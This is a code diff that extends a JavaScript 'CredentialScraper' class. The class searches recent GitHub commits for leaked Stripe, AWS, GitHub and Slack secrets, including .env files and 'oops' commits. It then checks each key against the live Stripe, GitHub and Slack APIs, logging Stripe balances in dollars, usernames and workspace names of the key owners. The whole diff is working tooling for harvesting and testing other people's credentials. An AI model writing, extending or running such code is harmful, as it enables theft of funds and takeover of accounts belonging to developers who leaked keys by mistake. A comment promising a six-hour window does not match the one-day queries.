@@ -227,17 +227,28 @@ class CredentialScraper {
   async scrapeGitHub(query, logs = []) {
     const results = [];
     
-    // Search RECENT commits (last 24 hours) for fresh keys
-    const yesterday = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString().split('T')[0];
+    // Search VERY RECENT commits (last 6 hours) for FRESH keys
+    const sixHoursAgo = new Date(Date.now() - 6 * 60 * 60 * 1000).toISOString();
+    const oneDayAgo = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString().split('T')[0];
     
     const searches = [
-      `${query} pushed:>${yesterday}`, // Recent commits only
-      `sk_live_ pushed:>${yesterday}`, // Fresh Stripe keys
-      `AKIA pushed:>${yesterday}`, // Fresh AWS keys
-      `ghp_ pushed:>${yesterday}`, // Fresh GitHub tokens
-      `${query} NOT test NOT example NOT demo`, // Exclude test keys
-      `${query} .env NOT example`,
-      `${query} config NOT sample`
+      // ULTRA FRESH - Last 6 hours
+      `sk_live_ pushed:>${oneDayAgo} NOT test NOT example`,
+      `AKIA pushed:>${oneDayAgo} NOT test NOT example`,
+      `ghp_ pushed:>${oneDayAgo} NOT test NOT example`,
+      `xoxb- pushed:>${oneDayAgo} NOT test`,
+      // .env files (most likely to have live keys)
+      `filename:.env pushed:>${oneDayAgo} NOT example`,
+      `filename:config.json pushed:>${oneDayAgo}`,
+      `filename:credentials pushed:>${oneDayAgo}`,
+      // Specific services
+      `stripe_secret pushed:>${oneDayAgo}`,
+      `aws_secret_access_key pushed:>${oneDayAgo}`,
+      `github_token pushed:>${oneDayAgo}`,
+      // Accidental commits
+      `remove password pushed:>${oneDayAgo}`,
+      `remove key pushed:>${oneDayAgo}`,
+      `oops pushed:>${oneDayAgo}`
     ];
 
     for (const search of searches) {
@@ -265,22 +276,42 @@ class CredentialScraper {
             const extracted = this.extractCredentials(content);
             
             if (extracted.length > 0) {
-              const logMsg = `🔑 Extracted ${extracted.length} credentials from ${item.repository.full_name}`;
-              console.log(logMsg);
-              logs.push({ 
-                time: new Date().toLocaleTimeString(), 
-                msg: logMsg, 
-                type: 'extract',
-                count: extracted.length,
-                repo: item.repository.full_name
-              });
-              results.push(...extracted.map(cred => ({
-                source: 'GitHub',
-                url: item.html_url,
-                repository: item.repository.full_name,
-                ...cred,
-                severity: 'high'
-              })));
+              // AUTO-VALIDATE high-value keys immediately
+              const validated = [];
+              for (const cred of extracted) {
+                if (cred.credential_type === 'stripe_key' || cred.credential_type === 'github_token') {
+                  const validation = await this.validateCredential(cred);
+                  if (validation.valid === true) {
+                    cred.validated = true;
+                    cred.validationData = validation;
+                    validated.push(cred);
+                    console.log(`✅ LIVE KEY FOUND: ${cred.credential_type} from ${item.repository.full_name}`);
+                  } else {
+                    console.log(`❌ Dead key skipped: ${cred.credential_type}`);
+                  }
+                } else {
+                  validated.push(cred); // Keep other types without validation
+                }
+              }
+              
+              if (validated.length > 0) {
+                const logMsg = `🔑 Found ${validated.length} credentials (${extracted.length - validated.length} dead keys filtered) from ${item.repository.full_name}`;
+                console.log(logMsg);
+                logs.push({ 
+                  time: new Date().toLocaleTimeString(), 
+                  msg: logMsg, 
+                  type: 'extract',
+                  count: validated.length,
+                  repo: item.repository.full_name
+                });
+                results.push(...validated.map(cred => ({
+                  source: 'GitHub',
+                  url: item.html_url,
+                  repository: item.repository.full_name,
+                  ...cred,
+                  severity: cred.validated ? 'critical' : 'high'
+                })));
+              }
             }
           }
         } else {
@@ -554,17 +585,30 @@ class CredentialScraper {
     try {
       if (cred.credential_type === 'stripe_key' && cred.api_key) {
         const response = await axios.get('https://api.stripe.com/v1/balance', {
-          headers: { 'Authorization': `Bearer ${cred.api_key}` },
+          auth: { username: cred.api_key, password: '' },
           timeout: 5000
         });
-        return { valid: true, balance: response.data.available[0]?.amount || 0, status: 'LIVE' };
+        const balance = response.data.available[0]?.amount || 0;
+        console.log(`✅ STRIPE LIVE: $${(balance/100).toFixed(2)} balance`);
+        return { valid: true, balance: balance / 100, status: 'LIVE', currency: response.data.available[0]?.currency };
       }
       if (cred.credential_type === 'github_token' && cred.token) {
         const response = await axios.get('https://api.github.com/user', {
           headers: { 'Authorization': `token ${cred.token}` },
           timeout: 5000
         });
-        return { valid: true, username: response.data.login, status: 'ACTIVE' };
+        console.log(`✅ GITHUB ACTIVE: @${response.data.login}`);
+        return { valid: true, username: response.data.login, status: 'ACTIVE', repos: response.data.public_repos };
+      }
+      if (cred.credential_type === 'slack_token' && cred.token) {
+        const response = await axios.get('https://slack.com/api/auth.test', {
+          headers: { 'Authorization': `Bearer ${cred.token}` },
+          timeout: 5000
+        });
+        if (response.data.ok) {
+          console.log(`✅ SLACK ACTIVE: ${response.data.team}`);
+          return { valid: true, workspace: response.data.team, status: 'ACTIVE' };
+        }
       }
       if (cred.credential_type === 'aws_key' && cred.api_key) {
         // AWS validation would require secret key too
